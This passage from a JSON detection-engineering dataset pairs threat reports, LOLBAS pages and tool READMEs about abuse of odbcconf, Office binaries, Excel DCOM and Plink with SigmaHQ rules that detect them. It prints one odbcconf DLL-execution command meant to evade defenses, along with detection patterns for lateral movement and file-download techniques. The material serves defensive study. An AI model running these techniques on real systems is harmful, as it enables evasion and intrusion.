        "filter_main_runonce_odbc": {
          "ParentImage": "C:\\Windows\\System32\\runonce.exe",
          "Image": "C:\\Windows\\System32\\odbcconf.exe",
          "CommandLine|contains": ".exe /E /F \"C:\\WINDOWS\\system32\\odbcconf.tmp\""
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file_susp.yml"
  },
  "311": {
    "url": "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html",
    "markdown": "# Emails with Backdoor Targets Russian Businesses **Malware** **August 07, 2017** --- A malicious email campaign against Russian-speaking enterprises is employing a combination of exploits and Windows components to deliver a new backdoor that allows attackers to take over the affected system. The attack abuses various legitimate Windows components to run unauthorized scripts; this is meant to make detection and blocking more challenging, particularly by whitelisting-based solutions. We’ve observed at least five runs from June 23 to July 27, 2017, each of which sent several malicious emails per target. Affected industries were financial institutions, including banks, and mining firms. Of",
    "sigma_rule": {
      "title": "Suspicious Response File Execution Via Odbcconf.EXE",
      "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
      "related": [
        {
          "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
          "type": "derived"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file with a non-\".rsp\" extension.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "filter_main_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
        "filter_main_runonce_odbc": {
          "ParentImage": "C:\\Windows\\System32\\runonce.exe",
          "Image": "C:\\Windows\\System32\\odbcconf.exe",
          "CommandLine|contains": ".exe /E /F \"C:\\WINDOWS\\system32\\odbcconf.tmp\""
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file_susp.yml"
  },
  "312": {
    "url": "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
    "markdown": "# ODBCCONF.EXE ODBCCONF.exe is a command-line tool that allows you to configure ODBC drivers and data source names. > **Note** > ODBCCONF.exe will be removed in a future version of Windows Data Access Components. Avoid using this feature, and plan to modify applications that currently use this feature. You can use PowerShell commands to manage drivers and data sources. For more information about these PowerShell commands, see Windows Data Access Components cmdlets. ## Syntax ``` ODBCCONF [switches] action ``` ## Arguments * *switches* Zero or more switch options. For the list of available switches, see the Remarks section, later in",
    "sigma_rule": {
      "title": "Uncommon Child Process Spawned By Odbcconf.EXE",
      "id": "8e3c7994-131e-4ba5-b6ea-804d49113a26",
      "status": "test",
      "description": "Detects an uncommon child process of \"odbcconf.exe\" binary which normally shouldn't have any child processes.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://medium.com/@cyberjyot/t1218-008-dll-execution-using-odbcconf-exe-803fa9e08dac"
      ],
      "author": "Harjot Singh @cyb3rjy0t",
      "date": "2023-05-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\odbcconf.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "In rare occurrences where \"odbcconf\" crashes. It might spawn a \"werfault\" process",
        "Other child processes will depend on the DLL being registered by actions like \"regsvr\". In case where the DLLs have external calls (which should be rare). Other child processes might spawn and additional filters need to be applied."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_uncommon_child_process.yml"
  },
  "313": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
    "markdown": "# /Odbcconf.exe Used in Windows for managing ODBC connections ### Paths: - `C:\\Windows\\System32\\odbcconf.exe` - `C:\\Windows\\SysWOW64\\odbcconf.exe` ### Resources: - https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b - https://github.com/woanware/application-restriction-bypasses - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/ ### Detections: - Sigma: proc_creation_win_odbcconf_response_file.yml - Sigma: proc_creation_win_odbcconf_response_file_susp.yml - Elastic: defense_evasion_unusual_process_network_connection.toml - Elastic: defense_evasion_network_connection_from_windows_binary.toml ## Execute 1. **Execute DllREgisterServer from DLL specified.** ``` odbcconf /a {REGSVR c:\\test\\test.dll} ``` **Properties:** - **Use case:** Execute dll file using technique that can evade defensive counter measures - **Privileges required:** User - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11 - **ATT&CK® technique:** T1218.008: Odbcconf - **Tags:** Execute: DLL 2. **Install a driver and load",
    "sigma_rule": {
      "title": "Uncommon Child Process Spawned By Odbcconf.EXE",
      "id": "8e3c7994-131e-4ba5-b6ea-804d49113a26",
      "status": "test",
      "description": "Detects an uncommon child process of \"odbcconf.exe\" binary which normally shouldn't have any child processes.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://medium.com/@cyberjyot/t1218-008-dll-execution-using-odbcconf-exe-803fa9e08dac"
      ],
      "author": "Harjot Singh @cyb3rjy0t",
      "date": "2023-05-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\odbcconf.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "In rare occurrences where \"odbcconf\" crashes. It might spawn a \"werfault\" process",
        "Other child processes will depend on the DLL being registered by actions like \"regsvr\". In case where the DLLs have external calls (which should be rare). Other child processes might spawn and additional filters need to be applied."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_uncommon_child_process.yml"
  },
  "314": {
    "url": "https://medium.com/@cyberjyot/t1218-008-dll-execution-using-odbcconf-exe-803fa9e08dac",
    "markdown": "# T1218.008 — DLL execution using ODBCCONF.exe May 8, 2023 --- ## What is ODBCConf.exe? _ODBCConf.exe is a Microsoft Windows utility that is used to manage Open Database Connectivity (ODBC) data sources. ODBCConf.exe allows you to configure and manage ODBC drivers and data sources on your computer. ODBC is a standard API (Application Programming Interface) for accessing data from different databases using SQL (Structured Query Language)._ _ODBCConf.exe is typically located in the “System32” folder of a Windows installation, and can be accessed from the Command Prompt or Run dialog box._ --- ## How threat actors can abuse ODBCConf.exe? _Threat actors",
    "sigma_rule": {
      "title": "Uncommon Child Process Spawned By Odbcconf.EXE",
      "id": "8e3c7994-131e-4ba5-b6ea-804d49113a26",
      "status": "test",
      "description": "Detects an uncommon child process of \"odbcconf.exe\" binary which normally shouldn't have any child processes.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://medium.com/@cyberjyot/t1218-008-dll-execution-using-odbcconf-exe-803fa9e08dac"
      ],
      "author": "Harjot Singh @cyb3rjy0t",
      "date": "2023-05-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\odbcconf.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "In rare occurrences where \"odbcconf\" crashes. It might spawn a \"werfault\" process",
        "Other child processes will depend on the DLL being registered by actions like \"regsvr\". In case where the DLLs have external calls (which should be rare). Other child processes might spawn and additional filters need to be applied."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_uncommon_child_process.yml"
  },
  "315": {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
    "markdown": "# /Winword.exe Microsoft Office binary ### Paths: - C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe - C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\winword.exe - C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\winword.exe - C:\\Program Files (x86)\\Microsoft Office\\Office16\\winword.exe - C:\\Program Files\\Microsoft Office\\Office16\\winword.exe - C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\winword.exe - C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\winword.exe - C:\\Program Files (x86)\\Microsoft Office\\Office15\\winword.exe - C:\\Program Files\\Microsoft Office\\Office15\\winword.exe - C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\winword.exe - C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\winword.exe - C:\\Program Files (x86)\\Microsoft Office\\Office14\\winword.exe - C:\\Program Files\\Microsoft Office\\Office14\\winword.exe - C:\\Program Files (x86)\\Microsoft Office\\Office12\\winword.exe - C:\\Program Files\\Microsoft Office\\Office12\\winword.exe - C:\\Program Files\\Microsoft Office\\Office12\\winword.exe ### Resources: - https://twitter.com/reegun21/status/1150032506504151040 - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191 ### Detections: - Sigma: proc_creation_win_office_arbitrary_cli_download.yml - IOC: Suspicious Office application",
    "sigma_rule": {
      "title": "Potential Arbitrary File Download Using Office Application",
      "id": "4ae3e30b-b03f-43aa-87e3-b622f4048eed",
      "related": [
        {
          "id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potential arbitrary file download using a Microsoft Office application",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
        "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Beyu Denis, oscd.community",
      "date": "2022-05-17",
      "modified": "2023-06-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\WINWORD.exe"
            ]
          },
          {
            "OriginalFileName": [
              "Excel.exe",
              "POWERPNT.EXE",
              "WinWord.exe"
            ]
          }
        ],
        "selection_http": {
          "CommandLine|contains": [
            "http://",
            "https://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_arbitrary_cli_download.yml"
  },
  "316": {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
    "markdown": "# /Powerpnt.exe Microsoft Office binary. ### Paths: - C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Powerpnt.exe - C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Powerpnt.exe - C:\\Program Files (x86)\\Microsoft Office\\Office16\\Powerpnt.exe - C:\\Program Files\\Microsoft Office\\Office16\\Powerpnt.exe - C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Powerpnt.exe - C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Powerpnt.exe - C:\\Program Files (x86)\\Microsoft Office\\Office15\\Powerpnt.exe - C:\\Program Files\\Microsoft Office\\Office15\\Powerpnt.exe - C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\Powerpnt.exe - C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\Powerpnt.exe - C:\\Program Files (x86)\\Microsoft Office\\Office14\\Powerpnt.exe - C:\\Program Files\\Microsoft Office\\Office14\\Powerpnt.exe - C:\\Program Files (x86)\\Microsoft Office\\Office12\\Powerpnt.exe - C:\\Program Files\\Microsoft Office\\Office12\\Powerpnt.exe - C:\\Program Files\\Microsoft Office\\Office12\\Powerpnt.exe ### Resources: - https://twitter.com/reegun21/status/1150032506504151040 - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191 ### Detections: - Sigma: proc_creation_win_lolbin_office.yml - IOC: Suspicious Office application Internet/network traffic ## Download",
    "sigma_rule": {
      "title": "Potential Arbitrary File Download Using Office Application",
      "id": "4ae3e30b-b03f-43aa-87e3-b622f4048eed",
      "related": [
        {
          "id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potential arbitrary file download using a Microsoft Office application",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
        "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Beyu Denis, oscd.community",
      "date": "2022-05-17",
      "modified": "2023-06-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\WINWORD.exe"
            ]
          },
          {
            "OriginalFileName": [
              "Excel.exe",
              "POWERPNT.EXE",
              "WinWord.exe"
            ]
          }
        ],
        "selection_http": {
          "CommandLine|contains": [
            "http://",
            "https://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_arbitrary_cli_download.yml"
  },
  "317": {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
    "markdown": "# /Excel.exe Microsoft Office binary ### Paths: - C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Excel.exe - C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Excel.exe - C:\\Program Files (x86)\\Microsoft Office\\Office16\\Excel.exe - C:\\Program Files\\Microsoft Office\\Office16\\Excel.exe - C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Excel.exe - C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Excel.exe - C:\\Program Files (x86)\\Microsoft Office\\Office15\\Excel.exe - C:\\Program Files\\Microsoft Office\\Office15\\Excel.exe - C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\Excel.exe - C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\Excel.exe - C:\\Program Files (x86)\\Microsoft Office\\Office14\\Excel.exe - C:\\Program Files\\Microsoft Office\\Office14\\Excel.exe - C:\\Program Files (x86)\\Microsoft Office\\Office12\\Excel.exe - C:\\Program Files\\Microsoft Office\\Office12\\Excel.exe - C:\\Program Files\\Microsoft Office\\Office12\\Excel.exe ### Resources: - https://twitter.com/reegun21/status/1150032506504151040 - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191 ### Detections: - Sigma: proc_creation_win_lolbin_office.yml - IOC: Suspicious Office application Internet/network traffic ## Download",
    "sigma_rule": {
      "title": "Potential Arbitrary File Download Using Office Application",
      "id": "4ae3e30b-b03f-43aa-87e3-b622f4048eed",
      "related": [
        {
          "id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potential arbitrary file download using a Microsoft Office application",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
        "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Beyu Denis, oscd.community",
      "date": "2022-05-17",
      "modified": "2023-06-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\WINWORD.exe"
            ]
          },
          {
            "OriginalFileName": [
              "Excel.exe",
              "POWERPNT.EXE",
              "WinWord.exe"
            ]
          }
        ],
        "selection_http": {
          "CommandLine|contains": [
            "http://",
            "https://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_arbitrary_cli_download.yml"
  },
  "318": {
    "url": "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191",
    "markdown": "# Unsanitized file validation leads to Malicious payload download via Office binaries. Update 23-Sep-2019 — Added to Lolbas|Lolbin contribution. https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/ https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/ https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/ As a part of finding vulnerable endpoints to improve defence, I used to reckon legitimate binaries on any chance of masking for payload download/execute. I focused my research towards Office binaries (winword/powerpnt/excel), My aim is to download a payload remotely via legitimate binaries by application whitelisting and execute via Office binaries. I came to know that we can able to open a remote document as Read-Only, I focused on that feature. ## 1. Payload Download — No proper",
    "sigma_rule": {
      "title": "Potential Arbitrary File Download Using Office Application",
      "id": "4ae3e30b-b03f-43aa-87e3-b622f4048eed",
      "related": [
        {
          "id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potential arbitrary file download using a Microsoft Office application",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
        "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Beyu Denis, oscd.community",
      "date": "2022-05-17",
      "modified": "2023-06-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\WINWORD.exe"
            ]
          },
          {
            "OriginalFileName": [
              "Excel.exe",
              "POWERPNT.EXE",
              "WinWord.exe"
            ]
          }
        ],
        "selection_http": {
          "CommandLine|contains": [
            "http://",
            "https://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_arbitrary_cli_download.yml"
  },
  "319": {
    "url": "https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922",
    "markdown": "# Lateral Movement: Abuse the Power of DCOM Excel Application In this post, we will talk about an interesting lateral movement technique called *ActivateMicrosoftApp()* method within the distributed component object model (DCOM) Excel application. This technique is built upon Matt Nelson's initial research on “Lateral Movement using Excel.Application and DCOM”. ## What is DCOM? DCOM is a Microsoft solution that allows software components to communicate remotely. Its predecessor, component object model (COM), lacked distributed computing functionality, so Microsoft introduced DCOM to serve the need of software components to communicate across the network. Basically, DCOM allows a client application to remotely",
    "sigma_rule": {
      "title": "Potential Excel.EXE DCOM Lateral Movement Via ActivateMicrosoftApp",
      "id": "551d9c1f-816c-445b-a7a6-7a3864720d60",
      "status": "test",
      "description": "Detects suspicious child processes of Excel which could be an indicator of lateral movement leveraging the \"ActivateMicrosoftApp\" Excel DCOM object.\n",
      "references": [
        "https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922",
        "https://github.com/grayhatkiller/SharpExShell",
        "https://learn.microsoft.com/en-us/office/vba/api/excel.xlmsapplication"
      ],
      "author": "Aaron Stratton",
      "date": "2023-11-13",
      "tags": [
        "attack.t1021.003",
        "attack.lateral-movement"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\excel.exe"
        },
        "selection_child": [
          {
            "OriginalFileName": [
              "foxprow.exe",
              "schdplus.exe",
              "winproj.exe"
            ]
          },
          {
            "Image|endswith": [
              "\\foxprow.exe",
              "\\schdplus.exe",
              "\\winproj.exe"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_excel_dcom_lateral_movement.yml"
  },
  "320": {
    "url": "https://github.com/grayhatkiller/SharpExShell",
    "markdown": "# SharpExShell ## Folders and Files: - .vs/SharpExShell/v16 - SharpExShell - packages/NDesk.Options.0.2.1 - .gitattributes - LICENSE - README.md - SharpExShell.sln # README ## SharpExShell SharpExShell automates the DCOM lateral movement technique which abuses the `ActivateMicrosoftApp` method of the Excel application. To read the blog: https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922",
    "sigma_rule": {
      "title": "Potential Excel.EXE DCOM Lateral Movement Via ActivateMicrosoftApp",
      "id": "551d9c1f-816c-445b-a7a6-7a3864720d60",
      "status": "test",
      "description": "Detects suspicious child processes of Excel which could be an indicator of lateral movement leveraging the \"ActivateMicrosoftApp\" Excel DCOM object.\n",
      "references": [
        "https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922",
        "https://github.com/grayhatkiller/SharpExShell",
        "https://learn.microsoft.com/en-us/office/vba/api/excel.xlmsapplication"
      ],
      "author": "Aaron Stratton",
      "date": "2023-11-13",
      "tags": [
        "attack.t1021.003",
        "attack.lateral-movement"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\excel.exe"
        },
        "selection_child": [
          {
            "OriginalFileName": [
              "foxprow.exe",
              "schdplus.exe",
              "winproj.exe"
            ]
          },
          {
            "Image|endswith": [
              "\\foxprow.exe",
              "\\schdplus.exe",
              "\\winproj.exe"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_excel_dcom_lateral_movement.yml"
  },
  "321": {
    "url": "https://learn.microsoft.com/en-us/office/vba/api/excel.xlmsapplication",
    "markdown": "# XlMSApplication enumeration (Excel) Specifies a Microsoft application. | Name | Value | Description | |-----------------------------|-------|-----------------------------| | **xlMicrosoftAccess** | 4 | Microsoft Office Access | | **xlMicrosoftFoxPro** | 5 | Microsoft FoxPro | | **xlMicrosoftMail** | 3 | Microsoft Office Outlook | | **xlMicrosoftPowerPoint** | 2 | Microsoft Office PowerPoint | | **xlMicrosoftProject** | 6 | Microsoft Office Project | | **xlMicrosoftSchedulePlus** | 7 | Microsoft Schedule Plus | | **xlMicrosoftWord** | 1 | Microsoft Office Word |",
    "sigma_rule": {
      "title": "Potential Excel.EXE DCOM Lateral Movement Via ActivateMicrosoftApp",
      "id": "551d9c1f-816c-445b-a7a6-7a3864720d60",
      "status": "test",
      "description": "Detects suspicious child processes of Excel which could be an indicator of lateral movement leveraging the \"ActivateMicrosoftApp\" Excel DCOM object.\n",
      "references": [
        "https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922",
        "https://github.com/grayhatkiller/SharpExShell",
        "https://learn.microsoft.com/en-us/office/vba/api/excel.xlmsapplication"
      ],
      "author": "Aaron Stratton",
      "date": "2023-11-13",
      "tags": [
        "attack.t1021.003",
        "attack.lateral-movement"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\excel.exe"
        },
        "selection_child": [
          {
            "OriginalFileName": [
              "foxprow.exe",
              "schdplus.exe",
              "winproj.exe"
            ]
          },
          {
            "Image|endswith": [
              "\\foxprow.exe",
              "\\schdplus.exe",
              "\\winproj.exe"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_excel_dcom_lateral_movement.yml"
  },
  "322": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling **January 24, 2019** Remote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to detect.",
    "sigma_rule": {
      "title": "Suspicious Plink Port Forwarding",
      "id": "48a61b29-389f-4032-b317-b30de6b95314",
      "status": "test",
      "description": "Detects suspicious Plink tunnel port forwarding to a local port",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling",
        "https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-01-19",
      "modified": "2022-10-09",
      "tags": [
        "attack.command-and-control",
        "attack.t1572",
        "attack.lateral-movement",
        "attack.t1021.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Description": "Command-line SSH, Telnet, and Rlogin client",
          "CommandLine|contains": " -R "
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrative activity using a remote port forwarding to a local port"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_plink_port_forwarding.yml"
  },
  "323": {
    "url": "https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d",
    "markdown": "# Remote SSH Tunneling with Plink.exe We will demonstrate how we can create remote ssh tunneling between a Windows Machine having a blocked service and a Linux Machine (Kali Machine). To get some more definitions about SSH tunneling, what is remote and local ssh tunneling (aka ssh port forwarding), please google it (I recommend you to visit https://www.ssh.com/). **Starting with Kali Machine:** Let’s first check the initial case by dumping sockets with **ss** and grepping **sshd** to see if there is already running *sshd* service. **Command:** ``` kali@kali:~$ sudo ss -antlp | grep sshd ``` I had no output which",
    "sigma_rule": {
      "title": "Suspicious Plink Port Forwarding",
      "id": "48a61b29-389f-4032-b317-b30de6b95314",
      "status": "test",
      "description": "Detects suspicious Plink tunnel port forwarding to a local port",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling",
        "https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-01-19",
      "modified": "2022-10-09",
      "tags": [
        "attack.command-and-control",
        "attack.t1572",
        "attack.lateral-movement",
        "attack.t1021.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Description": "Command-line SSH, Telnet, and Rlogin client",
          "CommandLine|contains": " -R "
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrative activity using a remote port forwarding to a local port"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_plink_port_forwarding.yml"
  },
  "324": {
